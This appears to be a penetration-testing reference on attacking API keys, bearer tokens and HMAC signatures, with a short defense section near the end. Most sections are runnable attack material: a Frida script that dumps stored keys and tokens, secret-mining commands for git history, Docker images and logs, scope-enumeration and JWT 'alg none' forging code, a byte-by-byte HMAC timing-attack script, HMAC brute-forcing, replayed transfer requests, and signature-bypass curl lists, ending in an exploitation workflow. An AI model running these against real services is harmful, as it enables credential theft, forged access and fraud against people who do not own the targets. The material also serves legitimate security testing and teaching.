# API Key & Token Authentication Vulnerabilities

## Overview

API keys, bearer tokens, and HMAC signatures are commonly used for API authentication. This document covers comprehensive attack vectors against these authentication mechanisms, including exposure risks, validation flaws, and cryptographic weaknesses.

---

## 1. API Key Vulnerabilities

### 1.1 Client-Side Exposure

**Vulnerability**: API keys embedded in client-side code or mobile applications.

**Common Exposure Locations**:

**JavaScript/Frontend**:
```javascript
// Exposed in source
const API_KEY = "sk_live_abc123def456";
fetch(`https://api.target.com/data?api_key=${API_KEY}`);

// In bundled/minified code
grep -r "api_key\|apiKey\|API_KEY" ./dist/*.js
```

**Mobile Applications**:
```bash
# Android APK decompilation
apktool d app.apk
grep -r "api_key\|API_KEY\|apikey" ./app/

# Search in strings.xml
cat app/res/values/strings.xml | grep -i key

# Dex to Java
d2j-dex2jar app.apk
jd-gui classes-dex2jar.jar
# Search for key patterns

# iOS IPA analysis
unzip app.ipa
strings Payload/App.app/App | grep -i "key\|token\|secret"

# Frida runtime extraction
frida -U -f com.target.app -l extract_keys.js
```

**Frida Script for Key Extraction**:
```javascript
// extract_keys.js
Java.perform(function() {
    // Hook SharedPreferences
    var SharedPreferences = Java.use("android.content.SharedPreferences");
    SharedPreferences.getString.overload("java.lang.String", "java.lang.String").implementation = function(key, defValue) {
        var value = this.getString(key, defValue);
        if (key.toLowerCase().indexOf("key") !== -1 ||
            key.toLowerCase().indexOf("token") !== -1 ||
            key.toLowerCase().indexOf("secret") !== -1) {
            console.log("[SharedPreferences] " + key + " = " + value);
        }
        return value;
    };

    // Hook System.getProperty
    var System = Java.use("java.lang.System");
    System.getProperty.overload("java.lang.String").implementation = function(key) {
        var value = this.getProperty(key);
        console.log("[System.getProperty] " + key + " = " + value);
        return value;
    };
});
```

### 1.2 URL and Log Exposure

**Vulnerability**: API keys transmitted in URLs and logged.

**Attack Vectors**:

**URL Parameters**:
```bash
# Keys in query strings are logged everywhere
https://api.target.com/data?api_key=sk_live_abc123

# Visible in:
# - Browser history
# - Proxy logs
# - Web server logs
# - Analytics tools
# - Referrer headers
```

**Log Mining**:
```bash
# Search server logs
grep -r "api_key=" /var/log/nginx/access.log
grep -r "Authorization:" /var/log/apache2/

# Search application logs
grep -r "key.*=.*[a-zA-Z0-9]{20,}" /var/log/app/

# CloudWatch/Log aggregators
# Search for patterns: sk_live, pk_live, api_key, bearer
```

**Referrer Header Leakage**:
```html
<!-- If page with API key loads external resources -->
<img src="https://analytics.com/track">
<!-- Referrer: https://app.com/page?api_key=sk_live_abc123 -->
```

### 1.3 Version Control Exposure

**Vulnerability**: API keys committed to version control.

**GitHub/GitLab Dorking**:
```
# GitHub searches
api_key site:github.com
"api_key" "target.com"
filename:.env api_key
filename:config.json api_key
extension:json api_key
"sk_live_" OR "sk_test_"
password OR secret OR key filename:.env
path:.env api_key

# GitLab searches
# Similar patterns in GitLab search
```

**Git History Mining**:
```bash
# Search entire git history
git log -p | grep -i "api_key\|secret\|password"

# Search for deleted files
git log --diff-filter=D --summary | grep -i config

# Search specific file history
git log -p -- config.js | grep -i key

# TruffleHog for automated scanning
trufflehog git https://github.com/target/repo

# Gitleaks
gitleaks detect --source=/path/to/repo

# git-secrets
git secrets --scan-history
```

**Docker Image Secrets**:
```bash
# Extract layers
docker save image:tag -o image.tar
tar -xf image.tar

# Search each layer
for layer in */layer.tar; do
  tar -tf $layer | xargs -I{} tar -xOf $layer {} 2>/dev/null | \
    grep -i "api_key\|secret\|password"
done

# Dive for interactive exploration
dive image:tag
```

### 1.4 Key Rotation Issues

**Vulnerability**: Old API keys remain valid indefinitely.

**Testing**:
```bash
# Test old key validity
OLD_KEY="old_api_key_from_leak"
curl https://api.target.com/data \
  -H "X-API-Key: $OLD_KEY"

# Test if rotation invalidates old keys
# 1. Note current key
# 2. Rotate key via dashboard
# 3. Test old key still works
```

**Rotation Testing Script**:
```python
import requests
import time

def test_key_rotation(api_url, keys_to_test):
    """Test if old API keys are properly invalidated"""
    results = []

    for key_info in keys_to_test:
        response = requests.get(
            api_url,
            headers={"X-API-Key": key_info['key']}
        )
        results.append({
            'key_id': key_info['id'],
            'age_days': key_info['age_days'],
            'status': response.status_code,
            'valid': response.status_code == 200
        })

    return results

# Test various old keys
keys = [
    {'id': 'current', 'key': 'sk_current', 'age_days': 0},
    {'id': 'last_week', 'key': 'sk_old1', 'age_days': 7},
    {'id': 'last_month', 'key': 'sk_old2', 'age_days': 30},
    {'id': 'leaked_key', 'key': 'sk_leaked', 'age_days': 365},
]

results = test_key_rotation('https://api.target.com/test', keys)
for r in results:
    print(f"Key {r['key_id']} (age: {r['age_days']}d): {'VALID' if r['valid'] else 'INVALID'}")
```

### 1.5 Scope and Permission Issues

**Vulnerability**: API keys with excessive permissions.

**Testing**:
```bash
# Test key scope
API_KEY="captured_key"

# Test read operations
curl https://api.target.com/users -H "X-API-Key: $API_KEY"

# Test write operations
curl -X POST https://api.target.com/users \
  -H "X-API-Key: $API_KEY" \
  -d '{"name": "test"}'

# Test admin operations
curl https://api.target.com/admin/settings \
  -H "X-API-Key: $API_KEY"

# Test different API versions
curl https://api.target.com/v1/data -H "X-API-Key: $API_KEY"
curl https://api.target.com/v2/data -H "X-API-Key: $API_KEY"
curl https://api.target.com/internal/data -H "X-API-Key: $API_KEY"
```

**Scope Enumeration**:
```python
import requests

def enumerate_api_permissions(base_url, api_key):
    """Enumerate what an API key can access"""
    endpoints = [
        ('GET', '/users'),
        ('POST', '/users'),
        ('DELETE', '/users/1'),
        ('GET', '/admin'),
        ('GET', '/billing'),
        ('GET', '/config'),
        ('POST', '/config'),
        ('GET', '/internal/debug'),
        ('GET', '/metrics'),
        ('GET', '/logs'),
    ]

    results = []
    for method, endpoint in endpoints:
        response = requests.request(
            method,
            f"{base_url}{endpoint}",
            headers={"X-API-Key": api_key}
        )
        results.append({
            'endpoint': f"{method} {endpoint}",
            'status': response.status_code,
            'accessible': response.status_code not in [401, 403]
        })

    return results

# Run enumeration
results = enumerate_api_permissions('https://api.target.com', 'captured_key')
for r in results:
    status = "ACCESSIBLE" if r['accessible'] else "DENIED"
    print(f"{r['endpoint']}: {r['status']} - {status}")
```

### 1.6 Validation Bypass

**Vulnerability**: Weak API key validation.

**Bypass Techniques**:
```bash
# Case sensitivity
X-API-Key: SK_LIVE_ABC123
X-API-Key: sk_live_abc123
X-API-Key: Sk_Live_Abc123

# Header name variations
X-API-Key: key
Api-Key: key
X-Api-Key: key
Authorization: key
Authorization: ApiKey key
Authorization: Bearer key

# Multiple headers
X-API-Key: invalid
X-Api-Key: valid_key

# URL parameter fallback
/api/data?api_key=key&apiKey=key&key=key

# Cookie fallback
Cookie: api_key=key

# Body parameter
{"api_key": "key", "data": "..."}
```

**Validation Testing**:
```bash
# Test without key
curl https://api.target.com/data

# Test with empty key
curl https://api.target.com/data -H "X-API-Key:"
curl https://api.target.com/data -H "X-API-Key: "

# Test with null/special values
curl https://api.target.com/data -H "X-API-Key: null"
curl https://api.target.com/data -H "X-API-Key: undefined"
curl https://api.target.com/data -H "X-API-Key: true"

# Test with partial key
curl https://api.target.com/data -H "X-API-Key: sk_"
curl https://api.target.com/data -H "X-API-Key: sk_live_"
```

---

## 2. Bearer Token Attacks

### 2.1 Token Leakage Vectors

**Vulnerability**: Bearer tokens exposed through various channels.

**Leakage Scenarios**:

**HTTP Response Headers**:
```bash
# Token in response headers
curl -v https://api.target.com/login 2>&1 | grep -i "token\|bearer\|auth"

# Set-Cookie with token
Set-Cookie: access_token=eyJ...; HttpOnly; Secure
```

**Error Messages**:
```bash
# Verbose error responses
curl https://api.target.com/data -H "Authorization: Bearer invalid"
# Response: "Token 'invalid' is not valid. Expected format: eyJ..."
```

**CORS Misconfiguration**:
```javascript
// If CORS allows credential exposure
fetch('https://api.target.com/user', {
    credentials: 'include'
}).then(r => r.json()).then(console.log);
```

**WebSocket Leakage**:
```javascript
// Token in WebSocket URL or messages
const ws = new WebSocket('wss://api.target.com/ws?token=eyJ...');
ws.onmessage = (e) => console.log(e.data);
```

### 2.2 Token Entropy Issues

**Vulnerability**: Predictable or low-entropy tokens.

**Analysis**:
```python
import math
from collections import Counter

def analyze_token_entropy(tokens):
    """Analyze token randomness"""
    results = []

    for token in tokens:
        # Calculate Shannon entropy
        freq = Counter(token)
        length = len(token)
        entropy = -sum(
            (count/length) * math.log2(count/length)
            for count in freq.values()
        )

        # Check for patterns
        is_sequential = all(
            ord(token[i+1]) - ord(token[i]) == 1
            for i in range(len(token)-1)
            if token[i].isdigit() and token[i+1].isdigit()
        )

        results.append({
            'token': token[:20] + '...',
            'length': length,
            'entropy_bits': entropy * length,
            'entropy_per_char': entropy,
            'has_patterns': is_sequential
        })

    return results

# Collect multiple tokens and analyze
tokens = [
    "abc123def456",
    "token_000001",
    "xK9mN2pQ7rS4",
]
for r in analyze_token_entropy(tokens):
    print(f"Token: {r['token']}")
    print(f"  Entropy: {r['entropy_bits']:.2f} bits")
    print(f"  Patterns: {'YES' if r['has_patterns'] else 'NO'}")
```

**Predictability Testing**:
```bash
# Collect multiple tokens
for i in {1..10}; do
  curl -X POST https://api.target.com/token | jq -r '.access_token' >> tokens.txt
done

# Analyze for patterns
cat tokens.txt | sort | uniq -c  # Check for duplicates
cat tokens.txt | cut -c1-10 | sort | uniq -c  # Check prefix patterns
```

### 2.3 Token Expiration Issues

**Vulnerability**: Long-lived or non-expiring tokens.

**Testing**:
```bash
# Check token expiration
TOKEN="captured_token"

# Test immediately
curl https://api.target.com/data -H "Authorization: Bearer $TOKEN"

# Test after time intervals
for delay in 3600 86400 604800; do
  echo "Waiting $delay seconds..."
  sleep $delay
  curl https://api.target.com/data -H "Authorization: Bearer $TOKEN"
done
```

**JWT Expiration Analysis**:
```python
import jwt
import time
from datetime import datetime

def analyze_token_expiration(token):
    """Analyze JWT expiration claims"""
    try:
        # Decode without verification
        payload = jwt.decode(token, options={"verify_signature": False})

        now = time.time()
        exp = payload.get('exp')
        iat = payload.get('iat')
        nbf = payload.get('nbf')

        if exp:
            exp_dt = datetime.fromtimestamp(exp)
            time_to_exp = exp - now
            print(f"Expires: {exp_dt} ({time_to_exp/3600:.1f} hours from now)")

        if iat:
            iat_dt = datetime.fromtimestamp(iat)
            print(f"Issued: {iat_dt}")

        if iat and exp:
            lifetime = exp - iat
            print(f"Token lifetime: {lifetime/3600:.1f} hours")

            if lifetime > 86400:  # More than 24 hours
                print("WARNING: Long-lived token")

        if not exp:
            print("WARNING: No expiration claim")

    except jwt.DecodeError as e:
        print(f"Not a valid JWT: {e}")

analyze_token_expiration("eyJ...")
```

### 2.4 Scope Confusion

**Vulnerability**: Token scope not properly enforced.

**Testing**:
```bash
# Token obtained for limited scope
TOKEN=$(curl -X POST https://auth.target.com/token \
  -d "scope=read:profile" | jq -r '.access_token')

# Test elevated scopes
curl https://api.target.com/users \
  -H "Authorization: Bearer $TOKEN"  # Should fail

curl https://api.target.com/admin \
  -H "Authorization: Bearer $TOKEN"  # Should fail

curl -X DELETE https://api.target.com/users/1 \
  -H "Authorization: Bearer $TOKEN"  # Should fail
```

**Scope Manipulation in JWT**:
```python
import jwt

def manipulate_jwt_scope(token, new_scope):
    """Attempt to modify JWT scope (if signature not verified)"""
    payload = jwt.decode(token, options={"verify_signature": False})
    payload['scope'] = new_scope
    payload['scp'] = new_scope  # Alternative claim name

    # Re-encode (only works if server doesn't verify signature)
    return jwt.encode(payload, '', algorithm='none')

# Test scope escalation
original_token = "eyJ..."
escalated = manipulate_jwt_scope(original_token, "admin:full read write delete")
```

### 2.5 Cross-API Token Usage

**Vulnerability**: Tokens accepted across different APIs/services.

**Testing**:
```bash
# Token from Service A
TOKEN_A=$(curl -X POST https://auth.service-a.com/token | jq -r '.access_token')

# Test on Service B
curl https://api.service-b.com/data \
  -H "Authorization: Bearer $TOKEN_A"

# Test on internal APIs
curl https://internal-api.target.com/data \
  -H "Authorization: Bearer $TOKEN_A"

# Test on partner APIs
curl https://partner-api.example.com/data \
  -H "Authorization: Bearer $TOKEN_A"
```

---

## 3. HMAC Signature Attacks

### 3.1 Timing Attacks

**Vulnerability**: String comparison reveals secret through timing differences.

**Attack Principle**:
- Byte-by-byte comparison stops at first mismatch
- Correct bytes take slightly longer to compare
- Attacker can deduce secret character by character

**Timing Attack Script**:
```python
import requests
import time
import statistics

def timing_attack_hmac(base_url, payload, known_prefix=""):
    """Attempt to recover HMAC via timing attack"""
    charset = "0123456789abcdef"  # Hex characters
    best_char = None
    best_time = 0

    for char in charset:
        test_sig = known_prefix + char + "0" * (63 - len(known_prefix))
        times = []

        for _ in range(100):  # Multiple samples for accuracy
            start = time.perf_counter_ns()
            response = requests.post(
                base_url,
                json=payload,
                headers={"X-Signature": test_sig}
            )
            elapsed = time.perf_counter_ns() - start
            times.append(elapsed)

        avg_time = statistics.mean(times)
        if avg_time > best_time:
            best_time = avg_time
            best_char = char

        print(f"Char '{char}': avg={avg_time/1000:.2f}us")

    return known_prefix + best_char

# Recover signature byte by byte
recovered = ""
for i in range(64):  # SHA256 = 64 hex chars
    recovered = timing_attack_hmac(
        "https://api.target.com/webhook",
        {"event": "test"},
        recovered
    )
    print(f"Recovered so far: {recovered}")
```

**High-Resolution Timing**:
```python
import ctypes
import os

# Use high-resolution timer
if os.name == 'nt':
    kernel32 = ctypes.windll.kernel32
    def get_time():
        return kernel32.GetTickCount64() * 1000
else:
    import time
    def get_time():
        return time.perf_counter_ns()
```

### 3.2 Key Recovery Attacks

**Vulnerability**: Weak key derivation or key material exposure.

**Common Weak Keys**:
```python
weak_keys = [
    b"secret",
    b"password",
    b"key",
    b"hmac_key",
    b"api_secret",
    b"changeme",
    b"12345678",
]

import hmac
import hashlib

def brute_force_hmac(message, signature, wordlist):
    """Brute force HMAC key"""
    for key in wordlist:
        computed = hmac.new(
            key.encode() if isinstance(key, str) else key,
            message.encode(),
            hashlib.sha256
        ).hexdigest()

        if hmac.compare_digest(computed, signature):
            return key

    return None

# Test
message = '{"user":"john","action":"transfer"}'
signature = "abc123..."  # Captured signature
key = brute_force_hmac(message, signature, weak_keys)
print(f"Found key: {key}")
```

**Hashcat HMAC Cracking**:
```bash
# Format: signature:message
echo "signature_hex:message_base64" > hmac.txt

# Crack with hashcat (mode 1450 for HMAC-SHA256)
hashcat -m 1450 hmac.txt /usr/share/wordlists/rockyou.txt
```

### 3.3 Replay Attacks

**Vulnerability**: Signed requests can be replayed.

**Attack Scenario**:
```bash
# Capture valid signed request
curl https://api.target.com/transfer \
  -H "X-Signature: abc123" \
  -H "X-Timestamp: 1609459200" \
  -d '{"amount": 100, "to": "attacker"}'

# Replay the exact same request
curl https://api.target.com/transfer \
  -H "X-Signature: abc123" \
  -H "X-Timestamp: 1609459200" \
  -d '{"amount": 100, "to": "attacker"}'
```

**Testing Replay Protection**:
```python
import requests
import time

def test_replay_protection(url, headers, data):
    """Test if replay protection exists"""

    # First request (should succeed)
    r1 = requests.post(url, headers=headers, json=data)
    print(f"First request: {r1.status_code}")

    # Immediate replay
    r2 = requests.post(url, headers=headers, json=data)
    print(f"Immediate replay: {r2.status_code}")

    # Delayed replay
    time.sleep(60)
    r3 = requests.post(url, headers=headers, json=data)
    print(f"Delayed replay (60s): {r3.status_code}")

    # Check if nonce is used
    if r1.status_code == 200 and r2.status_code == 200:
        print("WARNING: No replay protection!")
    elif 'nonce' in str(headers).lower():
        print("Nonce-based replay protection detected")
    elif 'timestamp' in str(headers).lower():
        print("Timestamp-based replay protection detected")

test_replay_protection(
    "https://api.target.com/action",
    {"X-Signature": "abc123", "X-Timestamp": "1609459200"},
    {"action": "test"}
)
```

### 3.4 Signature Bypass Techniques

**Vulnerability**: Signature validation can be bypassed.

**Bypass Methods**:

**Empty/Null Signature**:
```bash
curl https://api.target.com/data \
  -H "X-Signature:"

curl https://api.target.com/data \
  -H "X-Signature: null"

curl https://api.target.com/data
# No signature header at all
```

**Algorithm Confusion**:
```bash
# If server accepts multiple algorithms
curl https://api.target.com/data \
  -H "X-Signature: abc123" \
  -H "X-Signature-Algorithm: none"

curl https://api.target.com/data \
  -H "X-Signature: abc123" \
  -H "X-Signature-Algorithm: md5"  # Weaker algorithm
```

**Parameter Pollution**:
```bash
# Multiple signature headers
curl https://api.target.com/data \
  -H "X-Signature: invalid" \
  -H "X-Signature: valid_signature"

# Signature in different locations
curl "https://api.target.com/data?signature=url_sig" \
  -H "X-Signature: header_sig"
```

**Canonicalization Issues**:
```bash
# Different orderings that should produce same signature
# Test if order matters
'{"b":"2","a":"1"}' vs '{"a":"1","b":"2"}'

# Whitespace variations
'{"key":"value"}' vs '{ "key" : "value" }'

# Unicode normalization
'cafe' vs 'cafe\u0301'  # Different unicode representations
```

---

## 4. Tool Reference

### 4.1 API Key Testing Tools

**TruffleHog**:
```bash
# Scan git repo for secrets
trufflehog git https://github.com/target/repo

# Scan filesystem
trufflehog filesystem /path/to/code

# Scan with specific detectors
trufflehog git https://github.com/target/repo --only-verified
```

**Gitleaks**:
```bash
# Scan repository
gitleaks detect --source=/path/to/repo

# Scan with custom rules
gitleaks detect --config=custom-rules.toml

# Protect pre-commit
gitleaks protect --staged
```

**SecretFinder (for JS)**:
```bash
# Find secrets in JavaScript
python3 secretfinder.py -i https://target.com/app.js -o results.html
```

### 4.2 Token Analysis Tools

**jwt_tool** (for JWT tokens):
```bash
# Analyze token
jwt_tool eyJ...

# Crack weak secret
jwt_tool eyJ... -C -d /usr/share/wordlists/rockyou.txt

# Tamper claims
jwt_tool eyJ... -T
```

**Custom Token Analyzer**:
```python
#!/usr/bin/env python3
import sys
import base64
import json
import re

def analyze_token(token):
    """Comprehensive token analysis"""

    print(f"Token: {token[:50]}...")
    print(f"Length: {len(token)} characters")

    # Check if JWT
    if token.count('.') == 2:
        print("\nFormat: JWT")
        parts = token.split('.')
        try:
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            print(f"Header: {json.dumps(header, indent=2)}")
            print(f"Payload: {json.dumps(payload, indent=2)}")
        except:
            print("Failed to decode JWT")

    # Check for common patterns
    patterns = {
        'Stripe': r'^sk_(live|test)_',
        'AWS': r'^AKIA[0-9A-Z]{16}$',
        'GitHub': r'^gh[ps]_[A-Za-z0-9]{36}$',
        'Slack': r'^xox[baprs]-',
        'Google': r'^AIza[0-9A-Za-z\-_]{35}$',
    }

    for name, pattern in patterns.items():
        if re.match(pattern, token):
            print(f"\nIdentified as: {name} API Key")

    # Entropy analysis
    from collections import Counter
    import math
    freq = Counter(token)
    entropy = -sum((c/len(token)) * math.log2(c/len(token)) for c in freq.values())
    print(f"\nEntropy: {entropy:.2f} bits/char ({entropy * len(token):.0f} total bits)")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        analyze_token(sys.argv[1])
```

### 4.3 HMAC Testing Tools

**Python HMAC Calculator**:
```python
#!/usr/bin/env python3
import hmac
import hashlib
import sys
import argparse

def calculate_hmac(message, key, algorithm='sha256'):
    """Calculate HMAC signature"""
    algorithms = {
        'sha256': hashlib.sha256,
        'sha512': hashlib.sha512,
        'sha1': hashlib.sha1,
        'md5': hashlib.md5,
    }

    h = hmac.new(
        key.encode(),
        message.encode(),
        algorithms[algorithm]
    )
    return h.hexdigest()

def verify_hmac(message, key, signature, algorithm='sha256'):
    """Verify HMAC signature"""
    expected = calculate_hmac(message, key, algorithm)
    return hmac.compare_digest(expected, signature)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('message', help='Message to sign')
    parser.add_argument('key', help='HMAC key')
    parser.add_argument('--algorithm', '-a', default='sha256')
    parser.add_argument('--verify', '-v', help='Signature to verify')
    args = parser.parse_args()

    if args.verify:
        result = verify_hmac(args.message, args.key, args.verify, args.algorithm)
        print(f"Signature valid: {result}")
    else:
        sig = calculate_hmac(args.message, args.key, args.algorithm)
        print(f"Signature: {sig}")
```

### 4.4 Burp Suite Extensions

**Useful Extensions**:
```
- AuthMatrix: Test authorization across different roles
- Autorize: Automated authorization testing
- JWT Editor: JWT manipulation and attacks
- API Key Scanner: Find exposed API keys
- Param Miner: Discover hidden parameters
```

---

## 5. Defense Recommendations

### 5.1 API Key Security

```python
# Secure key generation
import secrets

def generate_api_key(prefix="sk", length=32):
    """Generate cryptographically secure API key"""
    random_part = secrets.token_urlsafe(length)
    return f"{prefix}_{random_part}"

# Key storage
# - Use secrets manager (AWS Secrets Manager, HashiCorp Vault)
# - Never commit to version control
# - Rotate regularly
# - Implement key scoping
```

### 5.2 Token Security

```python
# Short-lived tokens
TOKEN_LIFETIME = 900  # 15 minutes

# Include necessary claims
token_payload = {
    'sub': user_id,
    'iat': int(time.time()),
    'exp': int(time.time()) + TOKEN_LIFETIME,
    'jti': secrets.token_hex(16),  # Unique token ID
    'scope': 'read:user',  # Limited scope
    'aud': 'https://api.target.com',  # Audience restriction
}

# Implement token revocation
# - Maintain blacklist of revoked token IDs
# - Use short expiration to limit revocation window
```

### 5.3 HMAC Security

```python
import hmac
import hashlib
import time

def secure_hmac_verification(message, signature, key, timestamp, nonce, used_nonces):
    """Secure HMAC verification with replay protection"""

    # Check timestamp freshness (5 minute window)
    if abs(time.time() - timestamp) > 300:
        return False, "Timestamp too old"

    # Check nonce hasn't been used
    if nonce in used_nonces:
        return False, "Nonce already used"

    # Include timestamp and nonce in signed message
    signed_content = f"{timestamp}.{nonce}.{message}"

    # Use constant-time comparison
    expected = hmac.new(
        key.encode(),
        signed_content.encode(),
        hashlib.sha256
    ).hexdigest()

    if not hmac.compare_digest(expected, signature):
        return False, "Invalid signature"

    # Store nonce to prevent replay
    used_nonces.add(nonce)

    return True, "Valid"
```

---

## 6. Cheat Sheet

| Attack | Test Method | Key Indicator |
|--------|-------------|---------------|
| Key Exposure | Search repos/logs/code | Key found in plaintext |
| Weak Token | Entropy analysis | Low entropy/patterns |
| No Expiration | Replay old token | Token still valid |
| Scope Bypass | Access elevated endpoints | Access granted |
| Timing Attack | Measure response times | Time variations |
| Replay Attack | Resend valid request | Request accepted |
| Sig Bypass | Empty/null signature | Request accepted |

---

## 7. Attack Workflow

```
1. Reconnaissance
   - Identify authentication mechanism
   - Collect sample tokens/keys
   - Map API endpoints

2. Token/Key Analysis
   - Decode and analyze structure
   - Check entropy and patterns
   - Identify expiration/claims

3. Leakage Testing
   - Search version control
   - Check client-side code
   - Monitor logs/responses

4. Validation Testing
   - Test bypass techniques
   - Check scope enforcement
   - Verify replay protection

5. Exploitation
   - Use leaked/forged credentials
   - Escalate privileges
   - Document findings
```

---

## References

- OWASP API Security Top 10
- OWASP Authentication Cheat Sheet
- RFC 6750 - Bearer Token Usage
- RFC 2104 - HMAC
- NIST SP 800-132 - Password-Based Key Derivation
- CWE-798 - Hard-coded Credentials
- CWE-321 - Hard-coded Cryptographic Key
